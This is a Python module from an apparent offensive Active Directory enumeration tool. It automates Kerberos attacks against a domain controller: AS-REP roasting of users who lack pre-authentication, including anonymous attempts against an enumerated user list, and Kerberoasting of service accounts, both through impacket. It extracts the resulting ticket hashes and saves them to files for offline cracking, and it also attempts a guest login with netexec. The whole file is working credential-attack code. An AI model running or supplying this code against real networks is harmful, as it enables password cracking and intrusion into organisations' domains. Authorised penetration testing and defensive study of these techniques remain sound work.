import re
import os
from winenum.core.result import ServiceResult
from winenum.core.target import Target
from winenum.core.runner import run_command
from winenum.core.utils import save_hash, save_to_file

def enum_kerberos(target: Target, open_ports: dict, output_dir: str, progress_id=None, progress_ui=None) -> ServiceResult:
    """Enumerate Kerberos service"""
    result = ServiceResult(service='kerberos', port=88)
    
    if 88 not in open_ports:
        if progress_ui:
            progress_ui.update(progress_id, description="[dim]Kerberos: Port closed[/dim]", completed=100)
        return result
    
    result.open = True
    
    if progress_ui:
        progress_ui.console.print("[green][+][/green] Kerberos service detected")
        if target.domain:
            progress_ui.console.print(f"  [blue][*][/blue] Domain: {target.domain}")
        progress_ui.update(progress_id, description="[green]Kerberos: Complete ✓[/green]", completed=100)
        
    return result

def asrep_roast(target: Target, open_ports: dict, output_dir: str, domain_users: list, progress_id=None, progress_ui=None) -> ServiceResult:
    """AS-REP roast users without pre-authentication"""
    result = ServiceResult(service='asrep', port=88)
    
    if 88 not in open_ports or not target.domain:
        if progress_ui:
            progress_ui.update(progress_id, description="[dim]AS-REP: Port closed or No Domain[/dim]", completed=100)
        return result
    
    result.open = True
    hashes_found = []
    
    if target.has_creds():
        if progress_ui:
            progress_ui.update(progress_id, description="[yellow]AS-REP: Querying with credentials...[/yellow]")
        
        cmd = ['impacket-GetNPUsers', target.impacket_target(),
               '-dc-ip', target.ip, '-request']
        
        if target.hash:
            cmd.extend(['-hashes', f':{target.hash}'])
        else:
            cmd.extend(['-p', target.password])
        
        code, stdout, stderr = run_command(cmd, timeout=60)
        hashes = re.findall(r'\$krb5asrep\$[^\s]+', stdout)
        hashes_found.extend(hashes)
    
    if domain_users:
        if progress_ui:
            progress_ui.update(progress_id, description=f"[yellow]AS-REP: Testing {len(domain_users)} enumerated users...[/yellow]")
        
        userfile = save_to_file(output_dir, 'users_asrep.txt', '\n'.join(domain_users))
        
        cmd = ['impacket-GetNPUsers', f'{target.domain}/',
               '-no-pass', '-usersfile', userfile, '-dc-ip', target.ip]
        
        code, stdout, stderr = run_command(cmd, timeout=120)
        hashes = re.findall(r'\$krb5asrep\$[^\s]+', stdout)
        hashes_found.extend(hashes)
    
    hashes_found = list(set(hashes_found))
    
    if hashes_found:
        if progress_ui:
            progress_ui.console.print(f"[magenta bold][★][/magenta bold] Found {len(hashes_found)} AS-REP roastable user(s)!")
        result.anonymous_access = True
        result.details['asrep_hashes'] = hashes_found
        
        for h in hashes_found:
            user_match = re.search(r'\$krb5asrep\$\d+\$([^@]+)@', h)
            if user_match and progress_ui:
                progress_ui.console.print(f"  [green][+][/green] {user_match.group(1)}")
            
            # Save hashes
            filepath = save_to_file(output_dir, 'asrep_hashes.txt', h + '\n', 'a')
            save_to_file(output_dir, 'hashes', h + '\n', 'a')
    
    if progress_ui:
        desc = f"[green]AS-REP: Complete ({len(hashes_found)} hashes) ✓[/green]" if hashes_found else "[dim]AS-REP: No hashes found[/dim]"
        progress_ui.update(progress_id, description=desc, completed=100)
    
    return result

def kerberoast(target: Target, open_ports: dict, output_dir: str, progress_id=None, progress_ui=None) -> ServiceResult:
    """Kerberoast service accounts"""
    result = ServiceResult(service='kerberoast', port=88)
    
    if 88 not in open_ports:
        if progress_ui:
            progress_ui.update(progress_id, description="[dim]Kerberoast: Port closed[/dim]", completed=100)
        return result
    
    if not target.has_creds() or not target.domain:
        if progress_ui:
            progress_ui.update(progress_id, description="[dim]Kerberoast: Needs creds & domain[/dim]", completed=100)
        return result
    
    result.open = True
    
    if progress_ui:
        progress_ui.update(progress_id, description="[yellow]Kerberoast: Requesting TGS tickets...[/yellow]")
    
    cmd = ['impacket-GetUserSPNs', target.impacket_target(),
           '-dc-ip', target.ip, '-request']
    
    if target.hash:
        cmd.extend(['-hashes', f':{target.hash}'])
    else:
        cmd.extend(['-p', target.password])
    
    code, stdout, stderr = run_command(cmd, timeout=60)
    hashes = re.findall(r'\$krb5tgs\$[^\s]+', stdout)
    
    if hashes:
        if progress_ui:
            progress_ui.console.print(f"[magenta bold][★][/magenta bold] Found {len(hashes)} Kerberoastable service account(s)!")
        result.cred_access = True
        result.details['kerberoast_hashes'] = hashes
        
        spn_info = re.findall(r'(\S+/\S+)\s+(\S+)\s+\d{4}-', stdout)
        if progress_ui:
            for spn, user in spn_info:
                progress_ui.console.print(f"  [green][+][/green] {user} ({spn})")
        
        for h in hashes:
            save_to_file(output_dir, 'kerberoast_hashes.txt', h + '\n', 'a')
            save_to_file(output_dir, 'hashes', h + '\n', 'a')
    else:
        if 'ServicePrincipalName' in stdout and progress_ui:
            progress_ui.console.print("[yellow][!][/yellow] Kerberoast: Service accounts exist but no TGS obtained")
            
    if progress_ui:
        desc = f"[green]Kerberoast: Complete ({len(hashes)} hashes) ✓[/green]" if hashes else "[dim]Kerberoast: No hashes found[/dim]"
        progress_ui.update(progress_id, description=desc, completed=100)
        
    return result

def generate_krb5_conf(target: Target, open_ports: dict, output_dir: str):
    """Generate krb5.conf for Kerberos auth using netexec"""
    if not target.domain or 88 not in open_ports:
        return
    
    krb5_path = os.path.join(output_dir, 'krb5.conf')
    
    cmd = ['netexec', 'smb', target.ip]
    if target.has_creds():
        cmd.extend(target.netexec_auth())
    else:
        cmd.extend(['-u', 'guest', '-p', ''])
        
    cmd.extend(['-k', '--generate-krb5-file', krb5_path])
    
    code, stdout, stderr = run_command(cmd, timeout=15)
    
    if os.path.exists(krb5_path):
        os.environ['KRB5_CONFIG'] = krb5_path
    
